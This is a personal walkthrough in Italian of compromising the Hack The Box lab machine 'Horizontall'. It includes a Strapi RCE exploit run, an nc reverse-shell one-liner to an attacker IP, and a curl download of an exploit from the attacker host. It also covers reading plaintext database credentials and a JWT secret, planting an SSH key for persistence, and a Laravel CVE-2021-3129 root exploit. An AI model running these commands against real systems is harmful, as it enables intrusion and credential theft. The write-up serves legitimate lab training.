@@ -1,0 +1,236 @@
+10.10.11.105
+
+masscan -p1-65535 10.10.11.105 --rate 1000 --open --banners -e tun0
+
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.11.105                                    
+Discovered open port 22/tcp on 10.10.11.105
+
+
+
+nmap -sC -sV -p22,80 10.10.11.105
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+cerco di andare sul server web e mi ridireziona a https://horizontall.htb/ quindi aggiungo nel file /etc/hosts
+
+10.10.11.105	horizontall.htb
+
+http://horizontall.htb
+
+Build website using HT
+
+sembrano essrci delle api per sviluppatori web
+però i link non funzionano
+
+provo con fuzzing per trovare directories ecc
+
+sudo gobuster  dir -u http://horizontall.htb/  -w /usr/share/wordlists/dirb/big.txt -n -e -x .php,.html,.txt,.htm,.js,.xml,.svg,.py,.csv -t 200
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://horizontall.htb/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              svg,py,csv,php,html,txt,htm,js,xml
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+===============================================================
+2021/11/15 12:25:36 Starting gobuster in directory enumeration mode
+===============================================================
+http://horizontall.htb/css                  [Size: 194] [--> http://horizontall.htb/css/]
+http://horizontall.htb/favicon.ico          [Size: 4286]                                 
+http://horizontall.htb/img                  [Size: 194] [--> http://horizontall.htb/img/]
+http://horizontall.htb/index.html           [Size: 901]                                  
+http://horizontall.htb/js                   [Size: 194] [--> http://horizontall.htb/js/] 
+                                                                                         
+===============================================================
+2021/11/15 12:28:00 Finished
+===============================================================
+
+
+nulla di interessante
+
+provo quindi a trovare se ci sono altri vhost (subdomains) che potrebbero essere interessanti:
+
+gobuster  vhost -u http://horizontall.htb/  -w /home/daerves/Scrivania/git/SecNotes/lists/subdomains-top1million-110000.txt -t 200
+
+Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
+
+c'è un altro virtual host
+lo aggiungo ad /etc/hosts
+
+http://api-prod.horizontall.htb/
+
+
+c'è solo una pagina con scritto Welcome.
+
+provo quindi a fare fuzzing contro quest altro dominio
+
+/ADMIN                (Status: 200) [Size: 854]
+/Admin                (Status: 200) [Size: 854]
+/admin                (Status: 200) [Size: 854]
+/favicon.ico          (Status: 200) [Size: 1150]
+/robots.txt           (Status: 200) [Size: 121] 
+/reviews              (Status: 200) [Size: 507] 
+/secci�               (Status: 400) [Size: 69]  
+/users                (Status: 403) [Size: 60]
+
+
+in /admin (ADMIN,Admin) c'è una pagina di login a strapi  https://strapi.io/
+in /reviews semra esserci un api che raccoglie le reviews lasciate sul sito a proposito delle api dagli utente, controllare se si può aggiungere una review (magari XSS?)
+in /users c'è un altra api ma è 403 forbidden
+
+posso provare ad accedere alla pagina con strapi
+cercando nel codice referenziato nella pagina di login trovo la stringa:
+
+strapi-plugin-content-type-builder@3.0.0-beta.17.4
+
+e per questa versione c'è un RCE unauthenticated:
+
+https://www.exploit-db.com/exploits/50239
+
+
+
+python3 50239.py http://api-prod.horizontall.htb/
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2OTg5Njk1LCJleHAiOjE2Mzk1ODE2OTV9.YkxnU52H8vN-MdYYbEj9C4C1osnnzqb9PhETyer-J8Y
+
+
+$> id
+[+] Triggering Remote code executin
+[*] Rember this is a blind RCE don't expect to see output
+
+devo cercare di ottenere una reverse shell
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4444 >/tmp/f
+
+$ id
+uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
+
+sotto la directory home c'è la dir per l'utente developer:
+
+developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
+
+e riesco anche a leggere user.txt:
+b727f62d7800f6e3087b26b672c8847f
+
+anche se probabilmente per puntare ad essere root devo prima accedere a developer comunque
+
+
+cat extensions/users-permissions/config/jwt.json
+{
+  "jwtSecret": "a0518819-c85e-40b4-8ab9-f88dacd048f7"
+}
+
+potrebbe essere utile anche s enon credo visto che non hoi bisogno di accedere all'applicazione web
+
+cat ./config/environments/development/database.json
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}
+
+potrebbe esserci riuso della pwd ?
+
+provo con su - developer
+no, la pwd è sbagliata 
+
+controllando netstat -an vedo la porta 8000 aperta, considerndo che fino ad ora ho trovato solo mysql come servizio (porta 3306) e le api (porta 1337) è strano che sia aperta
+quindi provoa d usare curl per connettermi e vedere cosa espone
+
+curl http://127.0.0.1:8000/
+
+tra tutta la apgina che mi restituisce si nota:
+
+Laravel v8 (PHP v7.4.18)
+
+potrebbe essere vulnerabile a questa vuln: https://www.ambionics.io/blog/laravel-debug-rce  --> https://github.com/nth347/CVE-2021-3129_exploit
+
+
+curl -X GET http://10.10.16.4:9999/exploit.py > exploit.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2935  100  2935    0     0   6889      0 --:--:-- --:--:-- --:--:--  6889
+$ chmod +x exploit.py
+$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
+Cloning into 'phpggc'...
+fatal: unable to access 'https://github.com/ambionics/phpggc.git/': Could not resolve host: github.com
+[i] Trying to clear logs
+[+] Logs cleared
+[i] PHPGGC not found. Cloning it
+[-] Fail to convert logs to PHAR
+[i] There is no output
+[i] Trying to clear logs
+[+] Logs cleared
+
+
+a quanto pare non riesco ad eseguirlo direttamente sulla macchina target, posso provare ad usare il port forwarding dalla mia macchina dove dovrei riuscire ad eseguirlo alla macchina target:
+
+TARGET:
+        mkdir ~/.ssh            //se non esiste
+    ATTACKER:
+        ssh-keygen -t rsa
+    TARGET (in ~/.ssh):
+        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEvSjWQSLI51+FranQDG6chUTFNk4L9SiML1+VfEUCfaHcDoynurn6cez0x+twonYmHVHPY7YCR3DxVIzdvK7wXHJcrLSuWeYrPnaXAv3UjcZW9ixD+rwN2zTJ286K/gjQ1E3LTHMHAphgGTZ0SQGxfBDrSuBGJO3hw9OrefO2HUzKSSEfPJZaXuzHxOMKflBhrnUPk82xtFl4jc465OEKZSkDHPaQtvxBf6GQyOXLThI7t1ncjLLmbQT3kDUMMCHO3Cn3JTG85BND9AJc3cdR4zkrY0yPQ1AFqbD1zznhopK7mhGU3AQzd34/gCqCXNXbsuELzs7YstRwP+uXd8jj0e9sqFM3+GCqXGovGa9ki5FRhXN7ux6/LiwLfs+d4gQHRhR0gHcK/64xmMbiahUpbYNTel5lMRnWV6l789005FQ05JM8Ae0KMhQR7gpaeaGqmk/wU87Cb1J+CxIhtgLFLLIVfT6idy+MJ0I9mjJzM89FUMrR0q8bdT2Wi0QMVr0= daerves@kali" > authorized_keys      //echo "la .pub"
+    ATTACKER:
+        chmod 600 d             //d è il file contente la chiave privata
+        sudo ssh -i d -L 8000:127.0.0.1:8000 strapi@horizontall.htb
+        //a questo punto qualunque richiesta inviata alla porta 8000 di localhost viene inviata alla porta 8000 di horizontall.htb e da questa viene inoltrata di nuovo a localhost sulla porta 8000 (invece che ad un terzo server) così è come avere il servizio in locale
+
+ 
+./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"                //si poteva ottenere una rev shell
+
+
+
+
+c2667c8dec97d9955e42f8b3cca43fb1
+
+
+
+
+
+
+
+
+
+
+
+
+
